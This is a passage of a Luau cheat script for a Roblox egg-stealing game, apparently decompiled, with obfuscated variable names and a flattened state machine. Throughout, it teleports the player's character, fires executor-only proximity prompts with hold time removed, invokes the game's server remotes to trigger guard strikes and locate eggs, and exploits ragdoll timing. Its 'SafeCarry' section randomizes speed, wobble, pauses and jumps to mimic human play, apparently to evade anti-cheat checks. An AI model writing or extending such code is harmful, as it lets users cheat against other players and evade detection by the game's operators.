						local flag5 = false

						for _, v25 in pairs(ok) do
							if type(v25) == "table" and v25.Uid == arg and (v25.State == "Slot" or v25.State == "Dropped") then
								flag5 = true
								break
							end
						end

						if not flag5 then
							return tbl4.Steal.Carrying == true
						end
					end

					n17 += task.wait(0.3)
				end

				return tbl4.Steal.Carrying == true
			end

			local fn36

			local function fn37(arg)
				local v25 = tbl4.Root()
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not v25 or not position then
					return math.huge
				end
				return (v25.Position - position).Magnitude
			end

			fn36 = function(arg)
				local huge = math.huge
				local v25 = nil

				for _, v26 in ipairs(arg) do
					local v27 = fn37(v26)

					if v27 < huge then
						huge = v27
						v25 = v26
					end
				end

				return v25, huge
			end

			local n17
			n17 = 20
			local n18
			n18 = 90
			local fn38, stealHome, fn39, fn40, fn41, n19

			do
				local n20 = 6

				fn38 = function(arg, arg2, arg3, arg4, arg5, arg6)
					fn25()
					local v25 = tbl4.Root()
					if not v25 then
						return false
					end
					local character = localPlayer.Character
					local position = v25.Position
					local tbl36 = {}
					local position2 = nil
					local flag5 = nil
					local str4 = nil
					local n21 = 0

					local function fn42()
						if arg4 ~= nil then
							return true
						end
						return true
					end

					local function fn43(arg7)
						n21 += arg7
						if fn16(arg2) then
							flag5 = false
							return nil
						end

						if arg3 and not tbl4.Steal.Carrying then
							flag5 = false
							str4 = "dropped"
							return nil
						end

						if arg6 then
							local v26 = arg6()

							if v26 then
								flag5 = false
								str4 = v26
								return nil
							end
						end

						local v26 = tbl4.Root()

						if not v26 or n21 >= 25 or localPlayer.Character ~= character then
							flag5 = false
							str4 = "respawned"
							return nil
						end

						return v26
					end

					local connection = RunService.Heartbeat:Connect(function(deltaTime)
						if flag5 ~= nil or fn42() or tbl4.AntiGuard.Busy then
							return
						end
						local v26 = fn43(deltaTime)
						if not v26 then
							return
						end

						if n15 < (v26.Position - position).Magnitude then
							if arg5 then
								flag5 = false
								str4 = "displaced"
								return
							end

							position = v26.Position
						end

						local n22 = (arg4 or 400) * (os.clock() < (tbl4.SafeCarry.SlowUntil or 0) and tbl4.SafeCarry.SlowFactor or 1)
						local n23

						if tbl4.SafeCarry.Enabled and tbl4.SafeCarry.Pace then
							n23 = math.min(n22, tbl4.SafeCarry.Pace())
						else
							n23 = n22
						end

						local n24 = arg - position
						local n25 = n23 * deltaTime
						local flag6 = n24.Magnitude <= math.max(n25, 0.05)
						position = flag6 and arg or position + n24.Unit * n25
						local vector = Vector3.new(n24.X, 0, n24.Z)
						local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or v26.CFrame.Rotation

						pcall(function()
							v26.CFrame = CFrame.new(position) * cframe
							v26.AssemblyLinearVelocity = Vector3.zero
							v26.AssemblyAngularVelocity = Vector3.zero
						end)

						if flag6 then
							flag5 = true
						end
					end)

					local connection2 = RunService.PreSimulation:Connect(function(deltaTime)
						if flag5 ~= nil or not fn42() or tbl4.AntiGuard.Busy then
							return
						end
						local v26 = fn43(deltaTime)
						if not v26 then
							return
						end
						local n22 = (arg4 or 400) * (os.clock() < (tbl4.SafeCarry.SlowUntil or 0) and tbl4.SafeCarry.SlowFactor or 1)
						local n23

						if tbl4.SafeCarry.Enabled and tbl4.SafeCarry.Pace then
							n23 = math.min(n22, tbl4.SafeCarry.Pace())
						else
							n23 = n22
						end

						if arg5 and position2 and (v26.Position - position2).Magnitude > n15 + n23 * deltaTime then
							flag5 = false
							str4 = "displaced"
							return
						end

						if fn23(v26, arg, n23, deltaTime, tbl36) then
							flag5 = true
						end

						position2 = v26.Position
						position = v26.Position
					end)

					while flag5 == nil do
						RunService.Heartbeat:Wait()
					end

					connection:Disconnect()
					connection2:Disconnect()

					if fn42() and not flag5 then
						fn24()
					end

					if flag5 then
						fn27(arg, arg4 ~= nil)
					end

					return flag5, str4
				end

				local tbl36 = {
					{
						Path = { "GearGiver_Slap", "Podium" },
						Offset = Vector3.new(-16.415, 21.072, -6.106),
					},
					{
						Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
						Offset = Vector3.new(-26.776, 1.75, 18.665),
					},
					{
						Path = {
							"__OBJECTS",
							"Machines",
							"RiftMachine",
							"Rift",
							"Meshes/VoidPortal_Cube.003",
						},
						Offset = Vector3.new(-26.776, 1.75, 18.665),
					},
				}

				stealHome = function()
					for _, v25 in ipairs(tbl36) do
						local v26 = workspace

						for _, v27 in ipairs(v25.Path) do
							v26 = v26 and v26:FindFirstChild(v27) or nil
						end

						if v26 and v26:IsA("BasePart") then
							return v26.CFrame:PointToWorldSpace(v25.Offset)
						end
					end

					return Vector3.new(528.7, 70.57, -364.11)
				end

				tbl4.StealHome = stealHome

				tbl4.InsideBase = function(arg)
					if not arg then
						arg = tbl4.Root()
						arg = arg and arg.Position
					end

					if arg == nil then
						return false
					end
					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("Areas")
					world = world and world:FindFirstChild("SeparationLine")
					return arg.X < (world and world:IsA("BasePart") and world.Position.X or 552)
				end

				local function fn42(arg)
					if tbl4.AntiGuard.Busy then
						return false
					end
					local character = localPlayer.Character
					local v25 = tbl4.Root()
					if not character or not v25 then
						return false
					end
					local rotation = v25.CFrame.Rotation
					local cFrame = CFrame.new(arg) * rotation

					pcall(function()
						character:PivotTo(cFrame)
					end)

					if (v25.Position - arg).Magnitude > 3 then
						pcall(function()
							v25.CFrame = cFrame
						end)
					end

					for _, descendant in ipairs(character:GetDescendants()) do
						if descendant:IsA("BasePart") then
							pcall(function()
								descendant.AssemblyLinearVelocity = Vector3.zero
								descendant.AssemblyAngularVelocity = Vector3.zero
							end)
						end
					end

					return true
				end

				local function fn43(arg)
					if tbl4.AntiGuard.Busy then
						return
					end
					local character = localPlayer.Character
					local v25 = tbl4.Root()
					if not character or not v25 or not arg then
						return
					end

					if (v25.Position - arg).Magnitude > 6 then
						fn42(arg)
						return
					end

					for _, descendant in ipairs(character:GetDescendants()) do
						if descendant:IsA("BasePart") and descendant ~= v25 and (descendant.Position - v25.Position).Magnitude > 12 then
							pcall(function()
								descendant.CFrame = v25.CFrame
								descendant.AssemblyLinearVelocity = Vector3.zero
							end)
						end
					end
				end

				local function fn44(arg, arg2)
					local n21 = 0

					while true do
						if not (n21 < n20) then
							return not fn16(arg)
						else
							if fn16(arg) then
								break
							end
							local character = localPlayer.Character
							local flag5 = fn34()
							local v25

							if not flag5 and character then
								for _, descendant in ipairs(character:GetDescendants()) do
									if descendant:IsA("Constraint") and string.find(descendant.Name, "RagdollConstraint", 1, true) then
										flag5 = true
										break
									end
								end

								v25 = flag5
							else
								v25 = flag5
							end

							if not v25 then
								return not fn16(arg)
							end
							fn43(arg2)
							n21 += RunService.Heartbeat:Wait()
						end
					end

					return false
				end

				local function fn45(arg)
					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("Areas")
					world = world and world:FindFirstChild("GuardAreas")
					local areaId = world and arg and arg.AreaId and world:FindFirstChild(arg.AreaId)
					return areaId and areaId:FindFirstChild("Guard") or nil
				end

				fn39 = function(arg)
					local v25 = fn45(arg)
					return v25 ~= nil and v25:GetAttribute("GuardState") == "Sleeping"
				end

				local n21 = 3

				fn40 = function(arg)
					local v25 = fn45(arg)
					local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
					if not v25 or not position then
						return nil, nil
					end

					local ok, result = pcall(function()
						return v25:GetPivot().Position
					end)

					if not ok then
						return nil, nil
					end
					local vector = Vector3.new(position.X - result.X, 0, position.Z - result.Z)
					if vector.Magnitude < 0.1 then
						return nil, nil
					end
					local n22 = result + vector.Unit * n21
					return Vector3.new(n22.X, position.Y + 3, n22.Z), result
				end

				local function fn46(arg, arg2)
					local tbl37 = { Landed = false, Destination = arg2 }
					local antiGuard = tbl4.AntiGuard
					antiGuard.HitArms = antiGuard.HitArms + 1
					tbl4.AntiGuard.HitArmedAt = os.clock()

					tbl37.Link = localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
						if tbl37.Landed or fn16(arg) then
							return
						end
						local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
						if not num or num <= workspace:GetServerTimeNow() then
							return
						end
						local v25 = tbl4.Root()
						if not v25 then
							return
						end
						tbl37.Landed = true
						fn25()
						tbl4.SafeCarry.JumpDistance = (tbl37.Destination - v25.Position).Magnitude
						tbl4.SafeCarry.JumpAt = os.clock()

						pcall(function()
							v25.CFrame = CFrame.new(tbl37.Destination)
							v25.AssemblyLinearVelocity = Vector3.zero
						end)
					end)

					tbl37.Stop = function()
						if tbl37.Link then
							tbl37.Link:Disconnect()
							tbl37.Link = nil
							tbl4.AntiGuard.HitArms = math.max(0, tbl4.AntiGuard.HitArms - 1)
						end
					end

					return tbl37
				end

				fn41 = function(arg, arg2, arg3)
					local character = localPlayer.Character
					character = character and character:FindFirstChildOfClass("Humanoid")

					if character then
						character.PlatformStand = false
					end

					local n22 = 0
					local v25 = nil

					while true do
						if not arg2.Landed and n22 < n17 then
							if not fn16(arg) then
								if arg3 then
									arg3(arg2)
								end

								if not tbl4.Steal.Carrying then
									v25 = v25 or n22
									if not (n22 - v25 > 1) then
										n22 += RunService.Heartbeat:Wait()
										continue
									end
								else
									n22 += RunService.Heartbeat:Wait()
									continue
								end
							end
						end

						break
					end

					arg2.Stop()
					return arg2.Landed
				end

				n19 = 20

				local function fn47(arg, arg2, arg3, arg4)
					local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
					if not position then
						return false
					end
					local n22 = 0
					local huge = math.huge

					while n22 < arg3 do
						if fn16(arg2) then
							return false
						end

						if tbl4.Steal.Carrying and not tbl4.Steal.WrongEgg(arg.Uid) then
							return true
						end

						if huge >= 0.1 then
							local v25 = fn30(arg.Uid, position)

							if v25 then
								pcall(function()
									v25.HoldDuration = 0
								end)

								if typeof(fireproximityprompt) == "function" then
									pcall(fireproximityprompt, v25)
								end
							else
								fn31(arg.Uid)
							end

							huge = 0
						end

						if arg4 then
							fn43(arg4)
						end

						local result = RunService.Heartbeat:Wait()
						n22 += result
						huge += result
					end

					return tbl4.Steal.Carrying == true
				end

				local function fn48(arg, arg2, arg3, arg4)
					local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
					if not position then
						return false
					end
					local n22 = position + Vector3.new(0, 3, 0)
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid and character:FindFirstChildWhichIsA("Tool") then
						pcall(function()
							humanoid:UnequipTools()
						end)
					end

					if arg3 then
						fn27(n22, true)
						str3 = "Waiting to stand up"
						if not fn44(arg2, n22) then
							return false
						end

						if tbl4.SafeCarry.Enabled and arg4 == nil and tbl4.SafeCarry.Settle then
							if not tbl4.SafeCarry.Settle(arg2, arg) then
								return false
							end
						end
					else
						str3 = "Jumping to the egg"
						local v25 = tbl4.Root()

						if v25 and (n22 - v25.Position).Magnitude <= n18 then
							pcall(function()
								local rotation = v25.CFrame.Rotation
								v25.CFrame = CFrame.new(n22) * rotation
								v25.AssemblyLinearVelocity = Vector3.zero
								v25.AssemblyAngularVelocity = Vector3.zero
							end)
						elseif not fn38(n22, arg2, nil, 400) then
							return false
						end
					end

					if fn16(arg2) then
						return false
					end
					local flag5 = arg4 and typeof(arg4.CFrame) == "CFrame"
					local v25 = nil

					if flag5 then
						v25 = fn46(arg2, arg4.CFrame.Position + Vector3.new(0, 3, 0))
					end

					local str4 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
					local flag6 = type(arg.Uid) == "string" and string.sub(arg.Uid, 1, #str4) == str4 and string.match(arg.Uid, "_([%w ]+:Slot_%d+)$") or nil
					arg4 = arg4 and flag6
					local flag7 = false

					if arg4 then
						local eggState = tbl.EggState

						if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
							str3 = "Taking the starter egg"

							task.spawn(function()
								pcall(eggState.CarryFieldEgg, arg.Uid, flag6)
							end)

							local n23 = 0

							while not tbl4.Steal.Carrying and n23 < 0.8 do
								if fn16(arg2) then
									return false
								end
								n23 += RunService.Heartbeat:Wait()
							end

							flag7 = tbl4.Steal.Carrying == true
						end
					end

					if not flag7 then
						str3 = "Taking the egg"
						flag7 = fn33(arg, arg2)

						if not flag7 and not fn16(arg2) then
							fn38(n22, arg2, nil, 400)
							flag7 = fn33(arg, arg2)
						end
					end

					if not flag7 and not fn35(arg.Uid, arg2) then
						if v25 then
							v25.Stop()
						end

						tbl35[arg.Uid] = os.clock() + n12
						str3 = "That egg would not come free"
						return false
					end

					if v25 then
						local reGuardPatrolForestStrike = networking:FindFirstChild("RE/GuardPatrol/ForestStrike")
						local v26 = fn45(arg) or fn45({ AreaId = "Forest" })
						local humanoidRootPart = v26 and v26:FindFirstChild("HumanoidRootPart")

						if reGuardPatrolForestStrike and reGuardPatrolForestStrike:IsA("RemoteEvent") and humanoidRootPart then
							str3 = "Calling the guard strike"

							pcall(function()
								reGuardPatrolForestStrike:FireServer({ EggUid = arg.Uid, GuardCFrame = humanoidRootPart.CFrame })
							end)
						end
					end

					tbl4.Steal.LastFinishedAt = os.clock()
					return true, v25
				end

				local huge = math.huge
				local huge2 = math.huge

				local function fn49(arg, arg2, arg3)
					local v25 = nil
					local v26 = nil

					for _, child in ipairs(workspace:GetChildren()) do
						if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
							local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")

							if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
								local magnitude = (child.Position - arg).Magnitude

								if magnitude < arg2 then
									arg2 = magnitude
									v25 = carryAreaEgg
									v26 = child
								end
							end
						end
					end

					if v25 and v26 and type(arg3) == "string" and not fn29(v26, arg3, arg) then
						return nil
					end
					return v25, v26
				end

				local function fn50(arg)
					local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
					local v25 = workspace:FindFirstChild(arg) or areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
					if not v25 then
						return nil
					end

					local ok, result = pcall(function()
						return v25:GetPivot().Position
					end)

					return ok and result or nil
				end

				local function fn51(arg)
					local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
					if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
						return nil
					end
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
					local records = ok and type(result) == "table" and result.Records or nil
					if type(records) ~= "table" then
						return nil
					end

					for _, record in pairs(records) do
						if type(record) == "table" and record.Uid == arg and typeof(record.BottomCFrame) == "CFrame" then
							return record.BottomCFrame.Position, true
						end
					end

					return nil, true
				end

				local function fn52(arg)
					local v25 = workspace:FindFirstChild(arg)
					if not v25 then
						return false
					end

					for _, descendant in ipairs(v25:GetDescendants()) do
						if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
							local ok, result, result2 = pcall(function()
								return descendant.Part0, descendant.Part1
							end)

							if ok then
								for _, v26 in ipairs({ result, result2 }) do
									if typeof(v26) == "Instance" and not v26:IsDescendantOf(v25) then
										local model = v26:FindFirstAncestorOfClass("Model")
										if model and model ~= localPlayer.Character and Players:GetPlayerFromCharacter(model) then
											return true
										end
									end
								end
							end
						end
					end

					return false
				end

				local function fn53(arg, arg2)
					local state = 1
					local v25, carryUid, n22, vector, connection, n23, n24, huge3, v26, v27, n25, huge4, flag5, v28, v29, v30, now, flag6, n26, flag7, flag8, v31

					while true do
						if state == 1 then
							v25 = arg
							carryUid = arg2

							if carryUid then
								state = 3
							else
								state = 2
							end
						elseif state == 2 then
							carryUid = tbl4.Steal.CarryUid
							state = 3
						elseif state == 3 then
							if type(carryUid) ~= "string" then
								state = 49
							else
								state = 4
							end
						elseif state == 4 then
							fn25()
							str3 = "Following the egg"
							n22 = nil
							vector = Vector3.zero

							connection = RunService.PreSimulation:Connect(function(deltaTime)
								local v32 = tbl4.Root()
								if not v32 or not n22 or tbl4.Steal.Carrying or fn16(v25) then
									return
								end

								if fn26() then
									if not tbl4.SafeCarry.Enabled and (v32.Position - n22).Magnitude > 2 then
										fn42(n22)
									end

									return
								end

								local n27 = math.max(deltaTime, 0.0041666666666666666)
								local n28 = vector + (n22 - v32.Position) / math.max(0.08, n27)
								local enabled = tbl4.SafeCarry.Enabled and tbl4.SafeCarry.Pace() or n7 + vector.Magnitude

								if enabled < n28.Magnitude then
									n28 = n28.Unit * enabled
								end

								local assemblyLinearVelocity = n28 + Vector3.new(0, workspace.Gravity * n27 * 0.5, 0)

								pcall(function()
									v32.AssemblyLinearVelocity = assemblyLinearVelocity
									v32.AssemblyAngularVelocity = Vector3.zero
								end)
							end)

							n23 = 0
							n24 = 0
							huge3 = math.huge
							v26 = nil
							v27 = nil
							n25 = 0
							huge4 = math.huge
							state = 5
						elseif state == 5 then
							flag5 = false

							if not (n23 < huge2) then
								state = 46
							else
								state = 6
							end
						elseif state == 6 then
							if fn16(v25) then
								state = 46
							else
								state = 7
							end
						elseif state == 7 then
							if tbl4.Steal.Carrying then
								state = 8
							else
								state = 11
							end
						elseif state == 8 then
							if tbl4.Steal.WrongEgg(carryUid) then
								state = 10
							else
								state = 9
							end
						elseif state == 9 then
							flag5 = true
							state = 46
						elseif state == 10 then
							str3 = "Picked up the wrong egg, dropped it"
							state = 11
						elseif state == 11 then
							v28 = tbl4.Root()

							if not v28 then
								state = 46
							else
								state = 12
							end
						elseif state == 12 then
							v29 = fn50(carryUid)

							if v29 then
								state = 19
							else
								state = 13
							end
						elseif state == 13 then
							if not (huge3 >= 0.5) then
								state = 20
							else
								state = 14
							end
						elseif state == 14 then
							v29, v30 = fn51(carryUid)

							if v29 then
								state = 18
							else
								state = 15
							end
						elseif state == 15 then
							huge3 = 0

							if v30 then
								state = 16
							else
								state = 20
							end
						elseif state == 16 then
							n24 += 1

							if not (n24 >= 4) then
								state = 20
							else
								state = 17
							end
						elseif state == 17 then
							str3 = "The egg is gone"
							state = 46
						elseif state == 18 then
							n24 = 0
							huge3 = 0
							state = 20
						elseif state == 19 then
							n24 = 0
							state = 20
						elseif state == 20 then
							if v29 then
								state = 21
							else
								state = 30
							end
						elseif state == 21 then
							now = os.clock()

							if v26 then
								state = 23
							else
								state = 22
							end
						elseif state == 22 then
							flag6 = v26
							state = 24
						elseif state == 23 then
							flag6 = v27
							state = 24
						elseif state == 24 then
							if flag6 then
								state = 25
							else
								state = 26
							end
						elseif state == 25 then
							flag6 = now > v27
							state = 26
						elseif state == 26 then
							if flag6 then
								state = 27
							else
								state = 29
							end
						elseif state == 27 then
							n26 = (v29 - v26) / math.max(now - v27, 0.0041666666666666666)

							if not (n26.Magnitude < 3000) then
								state = 29
							else
								state = 28
							end
						elseif state == 28 then
							vector = vector:Lerp(n26, 0.3)
							state = 29
						elseif state == 29 then
							n22 = v29 + Vector3.new(0, 3, 0)
							v26 = v29
							v27 = now
							state = 30
						elseif state == 30 then
							if not (n25 >= 0.4) then
								state = 34
							else
								state = 31
							end
						elseif state == 31 then
							if fn52(carryUid) then
								state = 33
							else
								state = 32
							end
						elseif state == 32 then
							str3 = "Egg dropped, taking it back"
							n25 = 0
							state = 34
						elseif state == 33 then
							str3 = "Another player has the egg, following it until it drops"
							n25 = 0
							state = 34
						elseif state == 34 then
							if n22 then
								state = 36
							else
								state = 35
							end
						elseif state == 35 then
							flag7 = n22
							state = 37
						elseif state == 36 then
							flag7 = (n22 - v28.Position).Magnitude <= n19
							state = 37
						elseif state == 37 then
							if flag7 then
								state = 39
							else
								state = 38
							end
						elseif state == 38 then
							flag8 = flag7
							state = 40
						elseif state == 39 then
							flag8 = huge4 >= 0.1
							state = 40
						elseif state == 40 then
							if flag8 then
								state = 41
							else
								state = 45
							end
						elseif state == 41 then
							v31 = fn49(n22 - Vector3.new(0, 3, 0), 6, carryUid)

							if v31 then
								state = 43
							else
								state = 42
							end
						elseif state == 42 then
							task.spawn(fn31, carryUid)
							huge4 = 0
							state = 45
						elseif state == 43 then
							pcall(function()
								v31.HoldDuration = 0
							end)

							huge4 = 0

							if typeof(fireproximityprompt) ~= "function" then
								state = 45
							else
								state = 44
							end
						elseif state == 44 then
							pcall(fireproximityprompt, v31)
							state = 45
						elseif state == 45 then
							local result = RunService.Heartbeat:Wait()
							n23 += result
							huge4 += result
							huge3 += result
							n25 += result
							state = 5
						elseif state == 46 then
							connection:Disconnect()
							fn24()

							if flag5 then
								state = 48
							else
								state = 47
							end
						elseif state == 47 then
							flag5 = tbl4.Steal.Carrying == true
							state = 48
						elseif state == 48 then
							return flag5
						elseif state == 49 then
							return false
						end
					end
				end

				local function fn54(arg, arg2)
					local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
					if not position then
						return false
					end

					if tbl4.InsideBase() and not tbl4.InsideBase(position) then
						local v25 = stealHome()

						if v25 then
							str3 = "Leaving the base through the safe zone"
							if not fn38(v25 + Vector3.new(0, 3, 0), arg2, nil, 400) then
								return false
							end
						end
					end

					str3 = "Flying to the egg"
					if not fn38(position + Vector3.new(0, 3, 0), arg2, nil, 400) then
						return false
					end
					str3 = "Taking the egg"
					local v25 = fn47(arg, arg2, 0.6, nil)

					if not v25 and not fn16(arg2) then
						v25 = fn33(arg, arg2)
					end

					if not v25 and not fn35(arg.Uid, arg2) then
						tbl35[arg.Uid] = os.clock() + n12
						return false
					end
					tbl4.Steal.LastFinishedAt = os.clock()
					return true
				end

				local tbl37 = { Uid = nil, Freed = nil, Token = nil }
				local n22 = 3

				local function fn55()
					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("Areas")
					local guardAreas = world and world:FindFirstChild("GuardAreas")
					local v25 = tbl4.Root()
					if not guardAreas or not v25 then
						return nil
					end
					local str4 = tostring(localPlayer.UserId)
					local carryAreaId = tbl4.Steal.CarryAreaId and fn45({ AreaId = tostring(tbl4.Steal.CarryAreaId) }) or nil
					local huge3 = math.huge
					local v26 = nil

					for _, child in ipairs(guardAreas:GetChildren()) do
						local guard = child:FindFirstChild("Guard")

						if guard then
							if tostring(guard:GetAttribute("TargetPlayer")) == str4 or tostring(guard:GetAttribute("WakeTargetPlayer")) == str4 then
								return guard
							end

							local ok, result = pcall(function()
								return guard:GetPivot().Position
							end)

							if ok then
								local magnitude = (result - v25.Position).Magnitude

								if magnitude < huge3 then
									v26 = guard
									huge3 = magnitude
								end
							end
						end
					end

					return carryAreaId or v26
				end

				local function fn56(arg, arg2, arg3)
					local v25 = fn55()
					if not v25 then
						return false
					end
					local v26 = fn46(arg, arg3 + Vector3.new(0, 3, 0))
					local n23 = 0

					while true do
						if not v26.Landed and n23 < n17 and not fn16(arg) then
							local ok, result = pcall(function()
								return v25:GetPivot().Position
							end)

							local v27 = tbl4.Root()

							if not (not ok or not v27) then
								if n21 + 5 < (result - v27.Position).Magnitude then
									local vector = Vector3.new(v27.Position.X - result.X, 0, v27.Position.Z - result.Z)
									local n24 = result + (vector.Magnitude > 0.1 and vector.Unit * n21 or Vector3.zero)

									fn38(Vector3.new(n24.X, result.Y + 3, n24.Z), arg, nil, 400, true, function()
										if v26.Landed then
											return "hit"
										end
										return nil
									end)
								end

								n23 += RunService.Heartbeat:Wait()
								continue
							end
						end

						break
					end

					v26.Stop()
					if not v26.Landed then
						return false
					end
					return fn53(arg, arg2)
				end

				tbl4.SafeCarry.Dangers = {}
				tbl4.SafeCarry.DangerAt = 0

				tbl4.SafeCarry.RefreshDangers = function()
					local safeCarry = tbl4.SafeCarry
					local dangerAt = safeCarry.DangerAt
					if os.clock() - dangerAt < 1 then
						return safeCarry.Dangers
					end
					safeCarry.DangerAt = os.clock()
					local dangers = {}

					local function fn57(arg)
						local ok, result, result2 = pcall(function()
							if arg:IsA("Model") then
								return arg:GetBoundingBox()
							end

							if arg:IsA("BasePart") then
								return arg.CFrame, arg.Size
							end
						end)

						if ok and result and result2 then
							local abs = math.abs
							local z = result2.Z
							local n23 = Vector3.new(math.abs(result2.X), 0, abs(z)) * 0.5
							local v25 = (result - result.Position):VectorToWorldSpace(n23)
							local x = n23.X
							local z2 = n23.Z
							local n24 = math.max(math.abs(v25.X), x, z2)
							local x2 = n23.X
							local z3 = n23.Z
							local n25 = math.max(math.abs(v25.Z), x2, z3)

							table.insert(dangers, {
								MinX = result.Position.X - n24,
								MaxX = result.Position.X + n24,
								MinZ = result.Position.Z - n25,
								MaxZ = result.Position.Z + n25,
								Name = arg.Name,
							})
						end
					end

					local function fn58(arg)
						if arg == "ScrambleLocalVisuals" or arg == "DrScrambleEvent" then
							return false
						end
						local v25 = string.lower(arg)
						return string.find(v25, "portal", 1, true) or string.find(v25, "teleport", 1, true) or string.find(v25, "mech", 1, true) or string.find(v25, "arena", 1, true) or string.find(v25, "scramble", 1, true)
					end

					for _, child in ipairs(workspace:GetChildren()) do
						if (child:IsA("Model") or child:IsA("BasePart") or child:IsA("Folder")) and fn58(child.Name) then
							if child:IsA("Folder") then
								for _, child2 in ipairs(child:GetChildren()) do
									fn57(child2)
								end
							else
								fn57(child)
							end
						end
					end

					local world = workspace:FindFirstChild("World")
					local build = world and world:FindFirstChild("Build")

					if build then
						for _, child in ipairs(build:GetChildren()) do
							if fn58(child.Name) then
								for _, child2 in ipairs(child:GetChildren()) do
									fn57(child2)
								end
							end
						end
					end

					safeCarry.Dangers = dangers
					return dangers
				end

				tbl4.SafeCarry.Avoid = function(arg, arg2)
					for _, v25 in ipairs(tbl4.SafeCarry.RefreshDangers()) do
						local n23 = v25.MinX - 12
						local n24 = v25.MaxX + 12
						local n25 = v25.MinZ - 12
						local n26 = v25.MaxZ + 12
						local v26, v27, v28 = ipairs({ { arg.X, arg2.X - arg.X, n23, n24 }, { arg.Z, arg2.Z - arg.Z, n25, n26 } })
						local flag5 = true
						local n27 = 0
						local n28 = 1

						for _, v29 in v26, v27, v28 do
							local v30 = v29[1]
							local v31 = v29[2]
							local v32 = v29[3]
							local v33 = v29[4]

							if math.abs(v31) < 1e-06 then
								if v30 < v32 or v30 > v33 then
									flag5 = false
								end
							else
								local n29 = (v32 - v30) / v31
								local n30 = (v33 - v30) / v31

								if not (n30 < n29) then
									local v34 = n30
									n30 = n29
									n29 = v34
								end

								local n31 = math.max(n27, n30)
								local n32 = math.min(n28, n29)

								if not (n32 < n31) then
									n28 = n32
									n27 = n31
								else
									flag5 = false
									n28 = n32
									n27 = n31
								end
							end
						end

						if flag5 and not (arg.X >= n23 and arg.X <= n24 and arg.Z >= n25 and arg.Z <= n26) then
							local n29 = n25 - 2
							local n30 = n26 + 2
							local flag6 = math.abs(arg.Z - n29) <= math.abs(arg.Z - n30) and n29 or n30

							if flag6 < -440 or flag6 > -290 then
								flag6 = flag6 == n29 and n30 or n29
							end

							local flag7 = math.abs(arg.X - n23) <= math.abs(arg.X - n24) and n23 or n24

							if math.abs(arg.Z - flag6) < 3 then
								flag7 = math.abs(arg2.X - n23) <= math.abs(arg2.X - n24) and n23 or n24
							end

							return Vector3.new(flag7, arg2.Y, flag6), v25.Name
						end
					end

					return arg2, nil
				end

				tbl4.SafeCarry.NewHuman = function(arg)
					local safeCarry = tbl4.SafeCarry
					local laneOffset = safeCarry.LaneOffset
					local tbl38

					tbl38 = {
						Clock = 0,
						Factor = 1,
						Target = 1,
						NextShift = 0,
						Phase = math.random() * 3.1415926535897931 * 2,
						Period = 2 + math.random() * 2.5,
						PauseUntil = 0,
						Lane = (math.random() * 2 - 1) * laneOffset,
						Step = function(arg2, arg3, arg4)
							tbl38.Clock = tbl38.Clock + arg2

							if tbl38.NextShift <= tbl38.Clock then
								tbl38.NextShift = tbl38.Clock + 0.5 + math.random()
								local n23 = math.max(safeCarry.SpeedJitter, 0)

								if arg then
									tbl38.Target = 1 - math.random() * n23
								else
									tbl38.Target = 1 + (math.random() * 2 - 1) * n23
								end
							end

							tbl38.Factor = tbl38.Factor + (tbl38.Target - tbl38.Factor) * math.min(arg2 * 3, 1)
							local wobble = safeCarry.Wobble
							local n23 = math.sin(tbl38.Clock * 2 * 3.1415926535897931 / tbl38.Period + tbl38.Phase) * wobble
							arg4 = arg4 and arg3 and safeCarry.JumpsPerMinute > 0

							if arg4 then
								local n24 = safeCarry.JumpsPerMinute / 60 * arg2
								arg4 = math.random() < n24
							end

							if arg4 then
								pcall(function()
									arg3.Jump = true
								end)
							end

							local flag5 = false

							if not arg then
								if tbl38.Clock < tbl38.PauseUntil then
									flag5 = true
								else
									local flag6 = safeCarry.PausesPerMinute > 0

									if flag6 then
										local n24 = safeCarry.PausesPerMinute / 60 * arg2
										flag6 = math.random() < n24
									end

									if flag6 then
										tbl38.PauseUntil = tbl38.Clock + 0.3 + math.random() * 0.9
										flag5 = true
									end
								end
							end

							return tbl38.Factor, tbl38.Lane + n23, flag5
						end,
					}

					return tbl38
				end

				tbl4.SafeCarry.React = function(arg, arg2)
					local n23 = math.max(0, math.min(arg, arg2))
					local n24 = math.max(arg, arg2, 0)
					return n23 + math.random() * (n24 - n23)
				end

				tbl4.SafeCarry.RunTo = function(arg, arg2)
					local safeCarry = tbl4.SafeCarry
					local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
					if not position then
						return false
					end
					fn25()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						humanoid.PlatformStand = false

						if character:FindFirstChildWhichIsA("Tool") then
							pcall(function()
								humanoid:UnequipTools()
							end)
						end
					end

					local v25 = safeCarry.NewHuman(false)
